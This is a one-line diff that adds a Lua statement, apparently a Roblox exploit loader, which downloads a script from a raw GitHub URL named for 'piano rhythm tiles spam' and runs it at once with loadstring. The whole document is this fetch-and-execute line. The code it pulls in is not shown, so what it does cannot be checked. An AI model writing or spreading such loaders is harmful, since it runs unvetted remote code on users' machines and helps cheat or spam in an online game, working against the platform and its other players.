@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/piano-rhythm-tiles-spam0-fcibar2viff7eb.lua"))()
